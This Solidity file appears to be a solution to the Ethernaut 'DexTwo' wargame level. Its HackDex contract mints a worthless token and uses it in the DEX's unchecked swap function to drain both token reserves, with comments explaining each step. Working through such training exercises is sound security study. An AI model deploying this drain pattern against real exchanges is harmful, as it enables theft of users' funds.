// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x051FF6E9db3E09Ba931F6537b0B2E0a13c2787c2

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/IERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/token/ERC20/ERC20.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/solc-0.6/contracts/math/SafeMath.sol";

import "./DexTwo.sol";

contract HackDex is ERC20 {
    constructor(string memory name, string memory symbol) public ERC20(name, symbol) {}

    function drain(address _dex) public {
        DexTwo dex = DexTwo(_dex);

        // add suficient funds to the account that in the dex contract will be the msg.sender (this contract address)
        _mint(address(this), 100);

        // add 1 token to the address of the dex contract to manipulate the get_swap_amount()
        _mint(address(dex), 1);

        // now approve the dex contract to transfer funds from this contract
        // needed for the first transferFrom() of the dex swap() method
        _approve(address(this), address(dex), balanceOf(address(this)));

        // then drain the token1 funds from the dex contract
        // because the sender address (this contract) has sufficient funds, the require() will pass
        // then because the dex contract has a balance of 1 token in this contract, the get_swap_amount()
        // will return the total balance the dex contract has in the token1 contract => (1 * 100) / 1
        dex.swap(address(this), dex.token1(), balanceOf(address(dex)));

        // approve again the dex contract to transfer funds from this contract
        // needed for the first transferFrom() of the dex swap() method
        _approve(address(this), address(dex), balanceOf(address(this)));
        
        // then drain the token2 funds from the dex contract
        // because the sender address (this contract) still has sufficient funds, the require() will pass
        // then because the dex contract now has a balance of 2 tokens in this contract 
        // (draining the token1 transferred 1 more to the dex contract address in this contract),
        // the get_swap_amount() will return the total balance the dex contract has in the token2 contract => (2 * 100) / 2
        dex.swap(address(this), dex.token2(), balanceOf(address(dex)));
    }
}